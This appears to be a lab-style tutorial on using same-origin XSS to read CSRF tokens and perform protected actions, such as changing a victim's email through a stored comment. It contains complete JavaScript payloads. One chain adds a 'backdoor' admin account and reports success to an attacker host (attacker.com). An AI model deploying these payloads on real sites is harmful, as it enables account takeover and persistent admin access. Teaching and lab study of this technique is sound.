# XSS — CSRF via XSS

## When this applies

The target enforces CSRF tokens (form-bound, double-submit, or per-request) but you have an XSS sink in the same origin. Same-origin XSS lets you read the token via the DOM and construct the state-changing request — CSRF protections are bypassed.

## Technique

1. Issue a same-origin GET to the page that contains the CSRF token.
2. Parse the token from the response (regex or DOM query).
3. Submit the state-changing POST with the parsed token plus attacker-controlled fields.

## Steps

1. **Analyze Change Email Function**:
   - Log in to the target application
   - Navigate to account page
   - Examine email change form
   - Identify CSRF token location
   - Note POST endpoint: `/my-account/change-email`

2. **Craft CSRF Token Extraction + Action Payload**:
   ```javascript
   <script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get','/my-account',true);
   req.send();

   function handleResponse() {
       var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
       var changeReq = new XMLHttpRequest();
       changeReq.open('post', '/my-account/change-email', true);
       changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       changeReq.send('csrf='+token+'&email=hacker@evil.com');
   };
   </script>
   ```

3. **Post Comment**:
   - Navigate to any blog post
   - Post comment with payload
   - Victim views comment
   - Email automatically changed

### HTTP Flow

1. **Fetch Page with Token**:
```http
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=victim-session
```

2. **Response Contains Token**:
```html
<form method="POST" action="/my-account/change-email">
    <input name="csrf" value="AbCdEf123456">
    <input name="email" value="victim@email.com">
</form>
```

3. **Extract Token with Regex**:
```javascript
var token = responseText.match(/name="csrf" value="(\w+)"/)[1];
// token = "AbCdEf123456"
```

4. **Submit Change Request**:
```http
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=victim-session
Content-Type: application/x-www-form-urlencoded

csrf=AbCdEf123456&email=hacker@evil.com
```

### Why CSRF Tokens Don't Stop XSS

**CSRF Protection Model**:
```
Cross-Origin Request → No token access → Request blocked
```

**XSS Advantage**:
```
Same-Origin XSS → Full DOM access → Token extracted → Request succeeds
```

**Key Principle**: CSRF tokens protect against cross-origin attacks, but XSS executes in same-origin context and bypasses Same-Origin Policy restrictions.

### Advanced CSRF via XSS

**Multiple Actions Chain**:
```javascript
<script>
// Step 1: Fetch CSRF token
fetch('/account')
    .then(r => r.text())
    .then(html => {
        var token = html.match(/csrf=([^"]+)/)[1];

        // Step 2: Change email
        return fetch('/account/change-email', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'csrf='+token+'&email=attacker@evil.com'
        });
    })
    .then(() => {
        // Step 3: Fetch new token
        return fetch('/account');
    })
    .then(r => r.text())
    .then(html => {
        var token = html.match(/csrf=([^"]+)/)[1];

        // Step 4: Add attacker as admin
        return fetch('/admin/add-user', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                csrf: token,
                username: 'backdoor',
                role: 'admin'
            })
        });
    })
    .then(() => {
        // Step 5: Exfiltrate confirmation
        fetch('https://attacker.com/success', {
            method: 'POST',
            body: 'Exploitation complete'
        });
    });
</script>
```

**Form Auto-Submit**:
```javascript
<script>
// Fetch token
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];

    // Create form
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/my-account/change-email';

    // Add CSRF token
    var csrfInput = document.createElement('input');
    csrfInput.name = 'csrf';
    csrfInput.value = token;
    form.appendChild(csrfInput);

    // Add email
    var emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'attacker@evil.com';
    form.appendChild(emailInput);

    // Submit
    document.body.appendChild(form);
    form.submit();
};
xhr.open('GET', '/my-account', true);
xhr.send();
</script>
```

## Verifying success

- HTTP response to the state-changing POST returns 200 / 302 (not 403 from CSRF middleware).
- Account state on the server reflects the change (email updated, role added, etc.).
- Replaying the request with the captured token from a different origin still fails — confirms token enforcement works, but XSS bypasses it.

## Common pitfalls

1. **Incorrect regex for token extraction** — token format may include `-`, `_`, or be inside JSON; `\w+` doesn't always match.
2. **Wrong Content-Type header** — server may expect `application/json` and reject form-encoded bodies (or vice versa).
3. **Not URL-encoding form data** — `+` becomes space, `&` separates fields, breaking the request body.
4. **Hardcoding token instead of extracting dynamically** — tokens may be per-request, single-use, or rotate on every page load.
5. **Using duplicate email address** — server may reject "no-op" updates and return success-looking error.

## Tools

- **Burp Repeater** — manually craft and verify the chained requests
- **Burp Logger++** — record victim's request flow when payload triggers
- **DevTools → Network** — inspect token format and POST body in your own session before crafting payload
